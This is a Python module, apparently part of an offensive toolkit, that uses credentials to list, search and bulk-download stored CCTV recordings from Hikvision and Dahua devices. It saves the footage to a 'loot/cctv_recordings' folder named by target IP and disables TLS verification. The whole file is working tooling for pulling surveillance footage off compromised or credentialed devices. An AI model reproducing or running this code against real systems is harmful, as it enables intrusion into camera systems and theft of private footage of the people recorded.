# language: Python, file: core/cctv/playback.py
# Playback downloader — automated recording download
import httpx
import os
import json
from datetime import datetime, timedelta
from typing import List, Optional


class PlaybackDownloader:
    """
    يسحب تسجيلات من Hikvision/Dahua.
    - اكتشاف فترة التسجيل
    - تنزيل بالتواريخ
    - دمج مقاطع في ملف واحد
    """

    def __init__(self, output_dir: str = "loot/cctv_recordings",
                  log_queue=None):
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)
        self.log = log_queue

    def _out(self, text):
        if self.log:
            self.log.put(f"[playback] {text}")

    # ==================== Hikvision ====================
    def hikvision_list_tracks(self, ip: str, port: int,
                                user: str, password: str) -> list:
        """
        يجلب tracks من ContentMgmt.
        """
        try:
            url = f"http://{ip}:{port}/ISAPI/ContentMgmt/record/tracks"
            r = httpx.get(url, auth=(user, password),
                            timeout=15, verify=False)
            if r.status_code != 200:
                return []

            import xml.etree.ElementTree as ET
            root = ET.fromstring(r.text)
            tracks = []
            for t in root.iter():
                if t.tag.endswith("Track"):
                    tracks.append({
                        "id": t.findtext(".//{*}id") or "?",
                        "channel": t.findtext(".//{*}Channel") or "?",
                        "description": t.findtext(".//{*}Description") or "",
                    })
            return tracks
        except Exception as e:
            self._out(f"list_tracks error: {e}")
            return []

    def hikvision_search(self, ip: str, port: int, user: str,
                          password: str, track_id: int,
                          start: str, end: str) -> list:
        """
        يبحث في تسجيلات بفترة محددة.
        start/end: ISO format (2024-01-01T00:00:00)
        """
        payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<CMSearchDescription>
  <searchID>{int(datetime.now().timestamp() * 1000)}</searchID>
  <trackList>
    <trackID>{track_id}</trackID>
  </trackList>
  <timeSpanList>
    <timeSpan>
      <startTime>{start}</startTime>
      <endTime>{end}</endTime>
    </timeSpan>
  </timeSpanList>
  <maxResults>100</maxResults>
  <searchResultPostion>0</searchResultPostion>
  <metadataList>
    <metadataDescriptor>//recordType.meta.std-cgi.com</metadataDescriptor>
  </metadataList>
</CMSearchDescription>'''

        try:
            r = httpx.post(
                f"http://{ip}:{port}/ISAPI/ContentMgmt/search",
                content=payload.encode(),
                auth=(user, password),
                headers={"Content-Type": "application/xml"},
                timeout=30, verify=False)

            if r.status_code != 200:
                return []

            import xml.etree.ElementTree as ET
            root = ET.fromstring(r.text)
            recordings = []
            for m in root.iter():
                if m.tag.endswith("searchMatchItem"):
                    recordings.append({
                        "track_id": m.findtext(".//{*}trackID") or "?",
                        "start": m.findtext(".//{*}startTime") or "?",
                        "end": m.findtext(".//{*}endTime") or "?",
                        "playback_uri": m.findtext(".//{*}playbackURI") or "",
                        "size": m.findtext(".//{*}size") or "?",
                    })
            return recordings
        except Exception as e:
            self._out(f"search error: {e}")
            return []

    def hikvision_download(self, ip: str, port: int, user: str,
                             password: str, playback_uri: str,
                             output_file: str) -> dict:
        """
        ينزّل تسجيل من playback_uri (RTSP أو HTTP).
        """
        # if RTSP → ffmpeg
        if playback_uri.startswith("rtsp://"):
            return self._download_rtsp(playback_uri, output_file)

        # HTTP download
        try:
            with httpx.stream("GET", playback_uri,
                               auth=(user, password),
                               timeout=None, verify=False) as r:
                total = 0
                with open(output_file, "wb") as f:
                    for chunk in r.iter_bytes(65536):
                        f.write(chunk)
                        total += len(chunk)
            return {
                "success": os.path.getsize(output_file) > 10000,
                "path": output_file,
                "size": os.path.getsize(output_file),
            }
        except Exception as e:
            return {"error": str(e)}

    def _download_rtsp(self, rtsp_url: str, output_file: str,
                        duration: Optional[int] = None) -> dict:
        """يستخدم ffmpeg لتنزيل RTSP"""
        import subprocess
        cmd = ["ffmpeg", "-rtsp_transport", "tcp",
               "-i", rtsp_url, "-c", "copy", "-y", output_file]
        if duration:
            cmd.insert(-1, "-t")
            cmd.insert(-1, str(duration))

        try:
            r = subprocess.run(cmd, capture_output=True, text=True,
                                timeout=600)
            return {
                "success": os.path.exists(output_file)
                            and os.path.getsize(output_file) > 10000,
                "path": output_file,
                "size": os.path.getsize(output_file)
                          if os.path.exists(output_file) else 0,
            }
        except subprocess.TimeoutExpired:
            return {"error": "timeout"}
        except FileNotFoundError:
            return {"error": "ffmpeg not installed"}

    # ==================== Dahua ====================
    def dahua_list_recordings(self, ip: str, port: int,
                                user: str, password: str,
                                channel: int = 1,
                                start: str = None,
                                end: str = None) -> list:
        """
        Dahua recordings via RPC.
        """
        start = start or (datetime.now() - timedelta(days=7)).strftime(
            "%Y-%m-%d %H:%M:%S")
        end = end or datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        try:
            # login first
            from core.cctv.dahua import DahuaAPI
            dahua = DahuaAPI(ip, port, user, password)
            login = dahua.login()
            if login.get("error"):
                return []

            # find recordings
            result = dahua._rpc("mediaFileFind.factory.create", {
                "condition": {
                    "Channel": channel,
                    "StartTime": start,
                    "EndTime": end,
                    "Types": ["dav"],
                    "Flags": ["Event", "Timing"],
                }
            })

            if "params" not in result:
                return []

            find_handle = result["params"].get("result", 0)

            # find next files
            files = []
            while True:
                find_next = dahua._rpc("mediaFileFind.findNextFile", {
                    "handle": find_handle,
                    "count": 50,
                })
                if "params" not in find_next:
                    break
                info = find_next["params"].get("info", [])
                if not info:
                    break
                files.extend(info)

            # close handle
            dahua._rpc("mediaFileFind.close", {"handle": find_handle})
            return files
        except Exception as e:
            self._out(f"dahua_list error: {e}")
            return []

    def dahua_download(self, ip: str, port: int, user: str,
                        password: str, channel: int,
                        start: str, end: str,
                        output_file: str) -> dict:
        """ينزّل تسجيل Dahua"""
        try:
            url = (f"http://{ip}:{port}/cgi-bin/playback.cgi"
                    f"?action=download&channel={channel}"
                    f"&starttime={start}&endtime={end}")
            with httpx.stream(
                "GET", url, auth=(user, password),
                timeout=None, verify=False) as r:
                total = 0
                with open(output_file, "wb") as f:
                    for chunk in r.iter_bytes(65536):
                        f.write(chunk)
                        total += len(chunk)

            return {
                "success": os.path.getsize(output_file) > 10000,
                "path": output_file,
                "size": os.path.getsize(output_file),
            }
        except Exception as e:
            return {"error": str(e)}

    # ==================== High-level ====================
    def auto_download_hikvision(self, ip: str, port: int,
                                  user: str, password: str,
                                  days_back: int = 7,
                                  channel: int = 1) -> dict:
        """
        تنزيل تلقائي لكل التسجيلات من الأيام الأخيرة.
        """
        self._out(f"auto-download from {ip}, {days_back}d back")

        start = (datetime.now() - timedelta(days=days_back))
        end = datetime.now()
        start_str = start.strftime("%Y-%m-%dT%H:%M:%S")
        end_str = end.strftime("%Y-%m-%dT%H:%M:%S")

        # find track
        tracks = self.hikvision_list_tracks(ip, port, user, password)
        if not tracks:
            return {"error": "no tracks"}

        track_id = int(tracks[0]["id"])
        self._out(f"using track {track_id}")

        # search
        recordings = self.hikvision_search(
            ip, port, user, password, track_id, start_str, end_str)

        if not recordings:
            return {"error": "no recordings found"}

        self._out(f"found {len(recordings)} recordings")

        # download each
        safe_ip = ip.replace(".", "_")
        results = []
        for i, rec in enumerate(recordings[:50]):  # max 50
            output = os.path.join(
                self.output_dir,
                f"{safe_ip}_rec_{i}_{rec['start'][:10]}.mp4")
            result = self.hikvision_download(
                ip, port, user, password, rec["playback_uri"], output)
            result["recording"] = rec
            results.append(result)
            self._out(f"[{i+1}/{len(recordings)}] {result.get('size', 0)} bytes")

        return {
            "ip": ip,
            "total_recordings": len(recordings),
            "downloaded": sum(1 for r in results if r.get("success")),
            "results": results,
        }
